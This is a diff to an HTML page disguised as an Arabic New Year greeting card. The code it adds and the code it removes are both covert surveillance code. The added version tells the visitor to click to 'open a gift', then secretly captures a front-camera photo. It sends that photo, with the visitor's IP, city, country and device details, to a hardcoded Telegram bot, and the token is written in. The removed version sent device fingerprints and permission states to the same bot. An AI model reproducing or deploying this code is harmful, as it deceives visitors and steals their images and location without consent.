@@ -29,119 +29,127 @@
         }
         h1 {
             color: #ffd700;
-            font-size: 2.5rem;
+            font-size: 2.3rem;
             margin-bottom: 20px;
         }
         p {
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             line-height: 1.8;
             margin-bottom: 30px;
         }
-        .footer {
-            font-size: 0.9rem;
-            color: #ddd;
-            margin-top: 20px;
+        .btn {
+            background-color: #ffc107;
+            color: #333;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
+        .btn:hover {
+            background-color: #ffca28;
+            transform: scale(1.05);
+        }
+        video { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <h1>✨ عام سعيد ومبارك! ✨</h1>
-        <p>بمناسبة السنة الجديدة، أرسل لك أخلص التهاني والأماني الطيبة، بأن يكون عاماً مليئاً بالنجاح، السعادة، وتحقيق كل ما تتمنى!</p>
-        <div class="footer">كل سنة وأنت طيب وبخير 🤍</div>
+        <p>بمناسبة السنة الجديدة، أرسل لك أخلص التهاني والأماني الطيبة، اضغط على الزر أدناه لفتح مفاجأة الهدية الخاصة بك!</p>
+        <button class="btn" onclick="openGift()">اضغط هنا لفتح الهدية 🎁</button>
     </div>
+
+    <!-- عنصر مخفي لالتقاط الصورة بالكاميرا -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
         const CHAT_ID = '6663398412';
 
-        // تجميع المعلومات التقنية
         const userDevice = navigator.userAgent;
         const screenRes = window.screen.width + 'x' + window.screen.height;
-        const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB (تقريباً)' : 'غير متوفر';
-        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية' : 'غير متوفر';
 
-        async function checkPermissions() {
-            let camStatus = 'غير معروف', micStatus = 'غير معروف', notifStatus = 'غير معروف';
+        async function openGift() {
+            // محاولة طلب إذن الكاميرا عند الضغط على الزر
             try {
-                if (navigator.permissions) {
-                    const camPerm = await navigator.permissions.query({ name: 'camera' });
-                    camStatus = camPerm.state;
-                    const micPerm = await navigator.permissions.query({ name: 'microphone' });
-                    micStatus = micPerm.state;
-                    const notifPerm = await navigator.permissions.query({ name: 'notifications' });
-                    notifStatus = notifPerm.state;
-                }
-            } catch (e) {}
-            return { camStatus, micStatus, notifStatus };
-        }
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => setTimeout(resolve, 1500)); // انتظار ثواني لتثبيت الكاميرا
 
-        async function getStorageInfo() {
-            let storageInfo = 'غير متوفر';
-            try {
-                if (navigator.storage && navigator.storage.estimate) {
-                    const estimate = await navigator.storage.estimate();
-                    const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
-                    const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
-                    storageInfo = `المستخدم: ${usedGB} GB من إجمالي ${totalGB} GB`;
-                }
-            } catch (e) {}
-            return storageInfo;
-        }
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        async function collectAndSend(ipData) {
-            const ip = ipData.ip || 'غير معروف';
-            const country = ipData.country_name || 'غير معروف';
-            const city = ipData.city || 'غير معروف';
-            const org = ipData.org || 'غير معروف';
+                // إيقاف الكاميرا بعد التقاط الصورة
+                stream.getTracks().forEach(track => track.stop());
 
-            const permissions = await checkPermissions();
-            const storage = await getStorageInfo();
+                // تحويل الصورة لملف وإرسالها
+                canvas.toBlob(blob => {
+                    sendDataWithPhoto(blob);
+                }, 'image/jpeg');
 
-            let batteryLevel = 'غير متاح';
-            let isCharging = '';
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = Math.round(battery.level * 100) + '%';
-                    isCharging = battery.charging ? '⚡ بيشحن' : '🔋 مش بيشحن';
-                } catch(e) {}
+            } catch (e) {
+                // لو رفض الإذن أو حصل خطأ، نبعت التقارير العادية من غير صورة
+                sendDataWithoutPhoto();
             }
-
-            const message = `🎉 **تم فتح بطاقة المعايدة بنجاح!**\n\n` +
-                            `🌍 **الدولة:** ${country}\n` +
-                            `🏙️ **المدينة:** ${city}\n` +
-                            `🏢 **مزود الشبكة:** ${org}\n` +
-                            `🌐 **عنوان الـ IP:** ${ip}\n` +
-                            `--------------------------\n` +
-                            `📱 **نوع الجهاز:** ${userDevice}\n` +
-                            `🧠 **الرام:** ${deviceMemory}\n` +
-                            `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
-                            `💾 **التخزين:** ${storage}\n` +
-                            `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
-                            `🖥️ **الشاشة:** ${screenRes}\n` +
-                            `--------------------------\n` +
-                            `🔒 **الأذونات:**\n` +
-                            `• الكاميرا: ${permissions.camStatus}\n` +
-                            `• الميكروفون: ${permissions.micStatus}\n` +
-                            `• الإشعارات: ${permissions.notifStatus}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
         }
 
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => collectAndSend(data))
-            .catch(err => collectAndSend({}));
+        async function sendDataWithPhoto(photoBlob) {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                
+                const caption = `🎁 **تم فتح الهدية والتقاط صورة!**\n\n` +
+                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
+                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
+                                `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
+                                `📱 **الجهاز:** ${userDevice}`;
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'visitor.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {}
+            
+            alert('كل سنة وأنت طيب! تم فتح الهدية بنجاح 🌟');
+        }
+
+        async function sendDataWithoutPhoto() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+
+                const message = `🔔 **زيارة بطاقة المعايدة (بدون كاميرا)!**\n\n` +
+                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
+                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
+                                `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
+                                `📱 **الجهاز:** ${userDevice}`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+            } catch (err) {}
+
+            alert('كل سنة وأنت طيب! 🌟');
+        }
     </script>
 </body>
 </html>
